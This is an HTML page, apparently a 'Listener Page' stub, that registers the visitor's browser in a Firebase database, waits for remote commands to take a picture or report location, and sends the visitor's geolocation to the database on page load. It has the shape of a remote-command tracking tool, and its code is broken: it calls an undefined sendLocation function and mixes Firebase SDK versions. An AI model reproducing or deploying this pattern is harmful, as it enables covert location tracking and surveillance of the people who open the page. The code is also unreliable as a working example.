<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Listener Page</title>
  
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>

  <script>
    // Firebase Configuration
    const firebaseConfig = {
      apiKey: "your-api-key",
      authDomain: "your-auth-domain",
      projectId: "your-project-id",
      storageBucket: "your-storage-bucket",
      messagingSenderId: "your-sender-id",
      appId: "your-app-id"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database(app);

    // Device ID generation (creates a unique entry for each device)
    const deviceId = firebase.database().ref().child('devices').push().key;

    // Register the device in Firebase
    firebase.database().ref('devices/' + deviceId).set({
      status: 'online',
      location: null,
      photo: null
    });

    // Listen for updates on the device's entry
    firebase.database().ref('devices/' + deviceId).on('value', function(snapshot) {
      const deviceData = snapshot.val();

      if (deviceData.photo === 'take_picture') {
        // Trigger picture capture
        takePicture();
      }

      if (deviceData.location) {
        // Send current location to Firebase
        sendLocation(deviceData.location);
      }
    });

    // Function to take a picture (camera access)
    function takePicture() {
      // Implement camera capture functionality here using HTML5 API
      alert('Picture captured (functionality pending).');
      
      // Example of setting the photo in Firebase after capturing it
      firebase.database().ref('devices/' + deviceId).update({
        photo: 'image_url'  // Set image URL or placeholder
      });
    }

    // Function to get the current location
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const location = {
            lat: position.coords.latitude,
            lon: position.coords.longitude
          };
          // Update the location in Firebase
          firebase.database().ref('devices/' + deviceId).update({
            location: location
          });
        });
      } else {
        console.error("Geolocation is not supported by this browser.");
      }
    }

    // Call getLocation when the page loads
    window.onload = getLocation;
  </script>
</head>
<body>
  <h1>Device is online</h1>
  <p>Waiting for commands...</p>
</body>
</html>
